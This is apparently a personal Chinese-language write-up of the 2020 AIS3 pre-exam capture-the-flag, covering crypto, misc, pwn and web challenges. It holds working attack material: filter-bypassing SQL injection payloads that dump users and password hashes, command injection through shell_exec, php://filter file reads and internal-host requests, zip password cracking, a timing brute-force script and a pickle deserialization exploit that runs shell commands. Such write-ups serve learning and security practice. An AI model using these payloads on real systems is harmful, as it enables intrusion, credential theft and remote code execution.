## 2020 AIS3 pre-exam & MyFirstCTF

第一次參加國內的CTF！ 整體下來的感覺總而言之是非常的充實，在web方面看到了很多神奇的東西，學到很多

pwn跟reverse類基本上看不懂:cry:

discord裡頭的都是神人啊 Q___Q 

只能說 Google真的是很好用

（下面按照解題順序寫）

### Crypto - T-Rex

給了個文字檔案，是個排版的很漂亮的對照表，加上一大串字元，顯然是要一個一個對的Flag

Spaghetti code 直接寫下去就得到flag:

```
AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}
```

 這個暴龍很G8 >_<

### Misc - piquero

一張圖片，盲人點字。

直接上google圖片查對照表，拿張紙一個一個對，不過大寫符號很煩就是了

Flag:

```
AIS3{I_feel_sleepy_Good_Night!!!}
```

### Misc - TsaiBro

拿到一個執行檔、一個文字檔。可以猜測文字檔是拿某個字串輸進去之後出來的結果。

拿ghidra開執行檔，轉換過程完全看不懂，不過給幾個input玩一下之後，看起來是一個字元可以對應到兩個「發財」，點的數量只跟字元有關係，所以就暴力對照解下去：

```bash
$ ./tsaibro ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgjijklmnopqrstuvwxyz1234567890_{}
Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
發財..發財.......發財..發財........發財........發財.發財........發財..發財........發財...發財........發財....發財....發財.....發財....發財......發財....發財.......發財....發財........發財.....發財.發財.....發財..發財.....發財...發財.....發財....發財.......發財.....發財.......發財......發財.......發財.......發財.......發財........發財....發財.發財....發財..發財....發財...發財....發財....
(以下略)
```

```python
# -*- coding: utf-8 -*-
money = （略）
x = money.split('發財')
alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
i=0
dic={}
while 2*i<len(x)-1:
    x1 = len(x[2*i]); x2 = len(x[2*i+1])
    dic[str(x1)+str(x2)] = alphabet[i]
    print(f"{x1}{x2}={alphabet[i]}")
    i+=1

sym = （略）
x = sym.split('發財')
alphabet = 'abcdefghijklmnopqrstuvwxyz'
i = 0
while 2*i < len(x)-1:
    x1 = len(x[2*i])
    x2 = len(x[2*i+1])
    dic[str(x1)+str(x2)] = alphabet[i]
    print(f"{x1}{x2}={alphabet[i]}")
    i += 1

sym = （略）
x = sym.split('發財')
alphabet = '1234567890_{}'
i = 0
while 2*i < len(x)-1:
    x1 = len(x[2*i])
    x2 = len(x[2*i+1])
    dic[str(x1)+str(x2)] = alphabet[i]
    print(f"{x1}{x2}={alphabet[i]}")
    i += 1

print(dic)
code = （TsaiBroSaid裡面的東西）
cd = code.split('發財')
for i in range(int(len(cd)/2)):
    try:
        print(dic[str(len(cd[i*2]))+str(len(cd[i*2+1]))], end='')
    except:
        print('not found: '+str(len(cd[i*2]))+str(len(cd[i*2+1])))
```

得到flag:

```
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
```

### Crypto - Brontosaurus

題目提示：Brontosaurus peek at last year’s problems with a long neck and picked up "KcufsJ".

給了個一大串顯然是JSfuck的檔案。一開始我還沒看出那個KcufsJ是Jsfuck拼反，還去上網查:man_facepalming:

所以就直接把整個東西反過來，丟到瀏覽器裡，會輸出flag:

```
AIS3{Br0n7Os4uru5_ch3at_3asi1Y}
```

### pwn - BOF

我很廢，所以這是我pwn唯一解開的一題 :sweat:

經典的BOF，程式進入還會很鄙視的說這題很簡單：

```
👻 They said there need some easy challenges, Okay here is your bof, but you should notice something in ubuntu 18.04.
```

稍微google一下之後知道這是指在遠端實施bof攻擊需要比自己測試多加8 byte，雖然我真的不知道為什麼

直接把程式丟到Ghidra裡知道buffer長`0x30`，後台在`0x400688`，直接丟進pwntools拿到flag：

```AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}```

### Crypto - Octopus

拿到的第一個100分以上的題目 可惜維基看太慢沒拿到首殺 >_<

題目提到[BB84 quantum key distribution](https://zh.wikipedia.org/wiki/量子密鑰分發)這東西（酷爆​​），給了一個Python程式和這個程式執行出來的結果。

看懂維基百科之後就可以寫程式了，做出共同密鑰取前 400 個 bit 然後跟他給的 400 bit 作 XOR 就是flag了。

```python
import random
soriB = "'+', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', ....（Basis）"
smyB = "'+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', 'x', ....（My Basis）"
sqb = "1j, 1j, (1+0j), (1+0j), 1j, 1j, (0.707+0.707j), (1+0j), .... (Qubits)"

oriB = soriB.split(", ")
print(oriB)
for i in range(len(oriB)):
    if oriB[i] == "'+'":
        oriB[i] = 0
    else:
        oriB[i] = 1

myB = smyB.split(", ")
for i in range(len(myB)):
    if myB[i] == "'+'":
        myB[i] = 0
    else:
        myB[i] = 1

qb = sqb.split(', ')
for i in range(len(qb)):
    if qb[i] == '(1+0j)':
        qb[i] = 'u'
    elif qb[i] == '1j':
        qb[i] = 'r'
    elif qb[i] == '(0.707+0.707j)':
        qb[i] = 'ru'
    elif qb[i] == '(0.707-0.707j)':
        qb[i] = 'rd'


def qb2bit(qb):
    if qb in ['u','ru']:
        return 0
    else:
        return 1

stream = ""
for i in range(1024):
    if oriB[i] == myB[i]:
        stream+=str(qb2bit(qb[i]))

key = int('0b' + stream[:400],2)
print(key)
alter = 0b1101000110100011011100111001111001000011111101101101010010000111111001000100010111000111100101000101100101010111110001101110100100110110011100010010110000100000001000001010011010010011111001101001010000010010110000100110100111110001000110101100000111100010010010001110010100101000011100101100010110100101010110100100111001111101100110010000001010111010010101001110110001011001001110100110100011000100
print(alter)
flag = key ^ alter
print(bytes.fromhex(hex(flag).strip('0x')).decode('UTF-8'))
```

得到flag:

```
AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}
```

### Misc - Soy

看到discord裡好多人都用手解，我在這裡真心表達尊敬:sweat_smile:

我怎麼搜都搜不到QRcode的演算法，倒是搜到了個可以Recover的工具XD

https://github.com/waidotto/strong-qr-decoder

把能看到的看不到的都餵給他：

```
$ cat qrdata.txt
xxxxxxx---xxx-xx--xxxxxxx
x-----x--x-xx-xxx-x-----x
x-xxx-x-x--x--xx--x-xxx-x
x-xxx-x-----x---x-x-xxx-x
x-xxx-x---xxx-----x-xxx-x
x-----x--x-xxx-xx-x-----x
xxxxxxx-x-x-x-x-x-xxxxxxx
--------xxxx-xxxx--------
????xxxxxx--xx---xx---x--
????xx??x-------xxx--x---
???x????x----x--x-xx-x-xx
???????x-xx-xx-x--x-xx---
????????x-xx-x----xxxx-x-
???-x???-x---x----x--x-xx
???-xxxx-xx------xxx-x---
????----x--x-x-x-x-------
?????xx??x--x--xxxxxxx--x
--------x-x---x-x---xxxx-
xxxxxxx-x----x-xx-x-xx-xx
x-----x-xxx-xxx-x---x--x-
x-xxx-x-x-xx-x--xxxxx-x-x
x-xxx-x---x---------xxxxx
x-xxx-x-xx---------xx-x-x
x-----x-xxxxxxx---xx-x-x-
xxxxxxx-x---xx-xx---xx-xx
$ python qr.py qrdata.txt
A�S3{H0w_c4nYy0u_f1nd_me?!?!?!!m
```

有點亂碼，不過正解flag是:

```
AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}
```

### Web - Shark

提示說是去年的考古題，所以就直接拿來用wwww

先用他給的path看index.php:

```php
<?php

    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }

?><!DOCTYPE html>
<head>
    <title>🦈🦈🦈</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>🦈🦈🦈</h1>
    <a href="?path=hint.txt">Shark never cries?</a>
</body>

```

開頭不能是`/`和`.`，所以用php filter 繞過去，看/proc/net/fib_trie，看去年的writeup官方還給了[這個網站](http://wp.blkstone.me/2018/06/abusing-arbitrary-file-read/#421)讓你找東西玩wwww

```
https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=/proc/net/fib_trie
```

```
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.22.0.0/16 2 0 2
        +-- 172.22.0.0/30 2 0 2
           |-- 172.22.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.22.0.3  <--- 主機
              /32 host LOCAL
        |-- 172.22.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
```

看 /proc/net/arp 也行得通？

```
IP address       HW type     Flags       HW address            Mask     Device
172.22.0.11      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.14      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.17      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.20      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.1       0x1         0x2         02:42:c9:d4:ce:4b     *        eth0
172.22.0.4       0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.15      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.18      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.21      0x1         0x0         00:00:00:00:00
```

不知道，我太菜看不懂。但總之另外一個主機是在 172.22.0.2。

直接`/?path=http://172.22.0.2/flag`就得到flag:

```
AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}
```

### Web - Owl

題目提示：1. 網頁裡有提示 2.這題根Crypto裡的turtle是混合題

題目點進去是一個登入畫面，可以打帳號和密碼，網頁最上面可以反白看提示：「guess the stupid account/password」

一開始我不知道這是什麼意思，所以我跑去看turtle那題，題目可以給個source參數看原始碼。

直接瞎猜owl是否也能用同一招，結果還真的可以 XD

拿到了原始碼，一看就知道是要玩SQL injection，然而他有做一些input過濾：

```php
// Get rid of sqlmap kiddies
if (stripos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') !== false) {
  redirect('/', "sqlmap is child's play");
}

// Get rid of you
$bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
$username = str_ireplace($bad, '', $username);
$username = str_ireplace($bad, '', $username);

// Auth
$hash = md5($password);
$row = (new SQLite3('/db.sqlite3'))
  ->querySingle("SELECT * FROM users WHERE username = '$username' AND password = '$hash'", true);
if (!$row) {
  redirect('/', 'login failed');
}
```

注意到他會把空格刪掉，我們可以用`/**/`來代替空格，但在這裡要把它寫成`/oorr**oorr/`，讓下面兩次取代刪掉oorr的部分

還有`--`也被過濾掉了，但這裡因為他是在篩選順序的最後一個，所以沒辦法用這一招，不過幸好`/*`也行得通，只是要換成`/oorr*`

開始inject啦，先試試看登入：

```
x'OoorrR''=''/oorr*   ( payload: x'OR''=''/* )
```

進去之後畫面上方有個反白的連結，是剛剛我們已經看到的原始碼 !??

看來其實正確路線是要先亂猜帳號密碼再進來看原始碼呢 (ˊ· w ·`)

好吧那我們就來看一下帳號密碼，網站會把query結果第二欄：

```
x'/oorr**oorr/unoorrion/oorr**oorr/seloorrect/oorr**oorr/1,group_concat(username),1/oorr**oorr/frfrfromomom/oorr**oorr/users/oorr*
(payload: x' union select 1,group_concat(username),1 from users/* )
```

這裡from不用oorr來藏是因為前面篩選順序的關係。全部的帳號：

```
root,admin,test,guest,info,adm,mysql,kaibro,oracle,ftp,pi,puppet,ansible,maojui,ec2,djosix,vagrant,azureuser,python,user,username,administrator
```

用同樣的方式可以拿到密碼的md5 hash，只是password要換成passwooorrrd（XDDD）

把hash丟到網路工具可以找到不少個密碼，比如說admin的密碼也是admin... 但是拿到這些沒什麼用，所以接下來檢查users裡頭有沒有其他欄位：

```
x'/oorr**oorr/unoorrion/oorr**oorr/seloorrect/oorr**oorr/1,sql,1/oorr**oorr/frfrfromomom/oorr**oorr/sqlite_master/oorr**oorr/whefrfromomre/oorr**oorr/name='users'/oorr*
payload: x' union select 1,sql,1 from sqlite_master where name='users'/*)
results: CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT )
```

這樣子可以知道users裡頭各個欄位的名字：`id, username password`，然後就可以一個一個看。（都沒有flag @_@）

既然題目提示flag就在資料庫裡，但是users裡頭又沒有，只能說明flag藏在另一個table裡啦～

尋找資料庫裡所有table：

```
x'/oorr**oorr/unoorrion/oorr**oorr/seloorrect/oorr**oorr/1,group_concat(name),1/oorr**oorr/frfrfromomom/oorr**oorr/sqlite_master/oorr**oorr/whefrfromomre/oorr**oorr/type='table'/oorr*
payload: x' union select 1,group_concat(name),1 from sqlite_master where type='table'/*
results: users,sqlite_sequence,garbage
```

`sqlite_sequence`是sqlite自動創建的，用不太到，flag一定在garbage裡面。使用前面看column name的方法看garbage，得到`CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )`，一樣一個一個看，最後看到在value裡頭：

![owl](pic/owl.png)

ㄏㄏ，反正我也不會用sqlmap。第一次解開SQL-I的題目真的是好爽A_A

本題心得：遇到sqlite的題目，直接想辦法讀sqlite_master就好了。

### Web - Squirrel

一點進去發現一堆漂來漂去的松鼠，底下有一些看不懂的東西：

![squirrel](pic/squirrel.png)

直接看原始碼，他是透過`api.php`去讀主機上的`/etc/passwd`，看來可以讀所有檔案！？直接叫他讀`api.php`：

```
/api.php?get=api.php

{"output":"<?php\n\nheader('Content-Type: application\/json');\n\nif ($file = @$_GET['get']) {\n    $output = shell_exec(\"cat '$file'\");\n    \n    if ($output !== null) {\n        echo json_encode([\n            'output' => $output\n        ]);\n    } else {\n        echo json_encode([\n            'error' => 'cannot get file'\n        ]);\n    }\n} else {\n    echo json_encode([\n        'error' => 'empty file path'\n    ]);\n}\n"}
```

看來這個php直接把你給的路徑丟進`shell_exec("cat '$file'")`裡頭，這相當於給了我們shell：

```
/api.php?get=';ls;a='
{"output":"api.php\ncss\nindex.html\njs\n"}
/api.php?get=';cd ..;ls;a='
{"output":"html\n"}
/api.php?get=';cd ../..;ls;a='
{"output":"backups\ncache\nlib\nlocal\nlock\nlog\nmail\nopt\nrun\nspool\ntmp\nwww\n"}
/api.php?get=';cd ../../..;ls;a='
{"output":"5qu1rr3l_15_4_k1nd_0f_b16_r47.txt\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}
```

就拿到flag惹，松鼠蠻可愛的ww

### Misc - Karuego

只給你一張檔案不知道在大什麼的圖片，上網稍微查了下圖片怎麼藏資料，幾乎全都是說把zip接在圖片後面

那就直接試著解壓縮：

```bash
$ unzip Karuego.png
Archive:  Karuego.png
warning [Karuego.png]:  2059568 extra bytes at beginning or within zipfile
  (attempting to process anyway)
[Karuego.png] files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg password:
```

真的是，而且還有加密。先用`dd`把zip部份拿出來，再使用`fcrackzip`配合rockyou.txt去試密碼：

```shell
$ dd bs=2059568 skip=1 if=Karuego.png of=out.zip
0+1 records in
0+1 records out
1201353 bytes transferred in 0.004195 secs (286379068 bytes/sec)
$ fcrackzip -v -u -D -p rockyou.txt out.zip
'files/' is not encrypted, skipping
found file 'files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg', (size cp/uc 113020/113110, flags 9, chk 216f)
found file 'files/Demon.png', (size cp/uc 1087747/1092860, flags 9, chk 86e2)
checking pw luis99fer

PASSWORD FOUND!!!!: pw == lafire
```

解壓縮之後可以得到flag的圖片：

![Demon](pic/Demon.png)

### Misc - Saburo

連上去，伺服器提示`Flag:`讓你輸入，然後會跑出cpu時間，拿flag的開頭`AIS3{`去試，很明顯時間跟錢面對了幾個字元直接相關，只是時間範圍其實落差蠻大。

直接上python：

```python
from pwn import *
import os

context.log_level = 'warning'
known = "AIS3{" 

chrs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_}"

while True:
    c=0
    prev = 0
    st = "\n"
    while c<len(chrs):
        
        avg = 0
        log.warning(f'Trying {known+chrs[c]}')
        for i in range(15):
            print(i,end='')
            p = remote("60.250.197.227", 11001)
            p.recvuntil('Flag: ')
            p.sendline(known+chrs[c])
            s = p.recvline()
            avg += int(s[18:-14])
            p.close()

        avg = avg
        print(f'  avg time={avg}')
        st += f'{chrs[c]}: {avg}\n'
        flag=0
        if avg > prev:
            flag=1
            prev = avg
            largeind = c
        
        c+=1
        
    print(st)
    log.warning(f'largest char: {chrs[largeind]}, time={prev}')
    ans = input('Enter char, or left empty to use largest: ')
    ans = ans.strip('\n')
    if ans=="":
        known += chrs[largeind]
        log.warning(f'new char: [{chrs[largeind]}], time={prev}')
    else:
        known += ans
        log.warning(f'new char: {ans}')

    if known[-1] == '}':
        break

print(known)
```

總之就是每個字元試15次，取最長的拿來試下一個。應該可以再優化，但是我很懶，我也懶的再跑一次，所以這裡我就不給flag了>_<

---------------------------------------------------

### Web - Snake

這題我是在結束之後才看到的，原來其實很簡單QwQ

題目給的python，會讀網址的data參數，base64解碼之後丟給pickle.loads()：

```python
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')
    
    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)
            
            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()
        
    return open(__file__).read()
```

弄了好就才發現那個`if data and not data`根本只是來告訴你flag在哪裡而已=_=

其實這題的考點在於`pickle.loads()`這個函式有漏洞，如果放入一個設計過的class就可以執行任意python函式。像這樣：

```python
import pickle
import pickletools
from base64 import b64encode as b64
import subprocess

cmd = input('enter command\n$ ').strip('\n')
class Exploit():
    def __reduce__(self):
        
        command = ("__import__('os').popen('"+ cmd +"').read()")

        return (eval, (command, ))

pickled = pickle.dumps(Exploit())
print(b64(pickled))
```

讓`__reduce__`函式傳回一個tuple，內包含要執行的函式加上一個tuple，執行`pickle.loads()`時就會把tuple裡的東西當作參數給你的函式執行。

這裡弄那麼麻煩是因為原題目沒有`import os`，總之那個字串丟給`eval`執行之後就會用shell執行你要的指令，然後把結果傳回stdout。比如要看到flag是什麼，只要給他個`cat /flag`就有了：

```
AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}
```

